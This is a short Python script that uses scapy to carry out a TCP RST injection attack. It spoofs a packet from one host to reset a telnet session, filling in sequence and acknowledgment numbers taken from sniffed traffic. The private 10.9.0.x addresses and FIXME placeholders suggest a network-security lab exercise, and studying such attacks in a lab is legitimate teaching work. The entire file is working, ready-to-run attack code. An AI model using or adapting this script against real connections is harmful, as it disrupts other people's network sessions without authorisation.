#! /usr/bin/env python3

""" 
RST Attack
"""

from scapy.all import IP, TCP, send


# FIXME: set server IP address
SRC_IP = "10.9.0.5"
SRC_PORT = 23

# FIXME: set client IP address
DST_IP = "10.9.0.6"
# FIXME: set clien port
DST_PORT = 60076

# FIXME: set the sequence number
# seq from server to client from most recent packet in sniff_telnet.py output
SEQ_NUM = 3120746982
# FIXME: set acknowledgment number
# ack from server to client from most recent packet in sniff_telnet.py output
ACK_NUM = 936306515


def send_rst_packet():
    ip = IP(src=DST_IP, dst=SRC_IP)
    tcp = TCP(sport=DST_PORT, dport=SRC_PORT,
              flags="R", seq=ACK_NUM, ack=SEQ_NUM)
    packet = ip / tcp
    print(packet.show())
    send(packet)


if __name__ == "__main__":
    send_rst_packet()
    # Usage: python3 rst_attack.py
    # Example: python3 rst_attack.py
